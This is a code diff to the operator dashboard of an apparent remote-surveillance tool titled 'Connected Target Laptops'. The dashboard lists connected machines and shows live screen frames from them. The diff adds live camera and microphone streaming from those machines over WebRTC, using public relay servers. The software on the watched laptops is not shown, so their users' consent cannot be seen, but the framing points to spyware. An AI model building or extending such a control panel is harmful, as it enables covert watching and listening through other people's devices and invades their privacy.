@@ -16,13 +16,25 @@
 <body>
     <h1 id="title">Connected Target Laptops</h1>
     <div id="clientsList" class="clients"></div>
-    <img id="preview" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #007bff; border-radius: 8px; background: black;">
+    <video id="preview-video" autoplay muted playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #007bff; border-radius: 8px; background: black;"></video>
+    <img id="preview-img" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #007bff; border-radius: 8px; background: black;">
     <button id="backBtn" class="hidden" style="margin-top:20px;">Back to PC List</button>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
+        let peerConnection;
+        const configuration = { 
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
+                { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
+                { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
+            ] 
+        };
         let activeTarget = null;
+        let activeType = null;
+        let iceCandidatesQueue = [];
         
         socket.emit('get-clients');
 
@@ -35,16 +47,24 @@
             Object.values(clients).forEach(client => {
                 const div = document.createElement('div');
                 div.className = 'client-card';
-                div.innerHTML = `<h3>${client.name}</h3><p style="color: #28a745; font-weight: bold;">🟢 Online</p>`;
-                div.onclick = () => watchClient(client.id, client.name);
+                const typeLabel = client.type === 'camera' ? '📷 Camera + Mic' : '🖥️ Screen Only';
+                div.innerHTML = `<h3>${client.name}</h3><p style="color: #bbb">${typeLabel}</p><p style="color: #28a745; font-weight: bold;">🟢 Online</p>`;
+                div.onclick = () => watchClient(client.id, client.name, client.type);
                 list.appendChild(div);
             });
         });
 
-        function watchClient(clientId, clientName) {
+        function watchClient(clientId, clientName, clientType) {
             activeTarget = clientId;
+            activeType = clientType;
             document.getElementById('clientsList').classList.add('hidden');
-            document.getElementById('preview').classList.remove('hidden');
+            
+            if (clientType === 'camera') {
+                document.getElementById('preview-video').classList.remove('hidden');
+            } else {
+                document.getElementById('preview-img').classList.remove('hidden');
+            }
+            
             document.getElementById('backBtn').classList.remove('hidden');
             document.getElementById('title').innerText = "Viewing: " + clientName;
             
@@ -54,17 +74,74 @@
 
         document.getElementById('backBtn').onclick = () => {
             document.getElementById('clientsList').classList.remove('hidden');
-            document.getElementById('preview').classList.add('hidden');
+            document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('preview-img').classList.add('hidden');
             document.getElementById('backBtn').classList.add('hidden');
             document.getElementById('title').innerText = "Connected Target Laptops";
+            
+            if (peerConnection) peerConnection.close();
+            peerConnection = null;
+            document.getElementById('preview-video').srcObject = null;
+            document.getElementById('preview-img').src = "";
+            
             socket.emit('stop-watch', activeTarget);
             activeTarget = null;
-            document.getElementById('preview').src = "";
+            activeType = null;
         };
 
         socket.on('screen-frame', (data) => {
+            if (data.from === activeTarget && activeType === 'screen') {
+                document.getElementById('preview-img').src = data.frame;
+            }
+        });
+
+        // WebRTC Signaling for Camera clients
+        socket.on('offer', async (data) => {
+            if (data.from !== activeTarget) return;
+            if (peerConnection) peerConnection.close();
+            
+            peerConnection = new RTCPeerConnection(configuration);
+            iceCandidatesQueue = [];
+            
+            peerConnection.onicecandidate = e => {
+                if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: activeTarget });
+            };
+            
+            peerConnection.onconnectionstatechange = () => {
+                console.log("Connection state:", peerConnection.connectionState);
+            };
+            
+            peerConnection.ontrack = e => {
+                console.log("Track received:", e.streams[0]);
+                const video = document.getElementById('preview-video');
+                video.srcObject = e.streams[0];
+                video.play().catch(err => console.error("Video play error:", err));
+            };
+
+            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
+            
+            // Process any ICE candidates that arrived before the offer
+            for (let candidate of iceCandidatesQueue) {
+                try {
+                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+                } catch (err) { console.error("ICE error", err); }
+            }
+            iceCandidatesQueue = [];
+
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+            socket.emit('answer', { answer, targetId: activeTarget });
+        });
+
+        socket.on('ice-candidate', async (data) => {
             if (data.from === activeTarget) {
-                document.getElementById('preview').src = data.frame;
+                if (peerConnection && peerConnection.remoteDescription) {
+                    try {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                    } catch (err) { console.error("ICE error", err); }
+                } else {
+                    iceCandidatesQueue.push(data.candidate);
+                }
             }
         });
     </script>
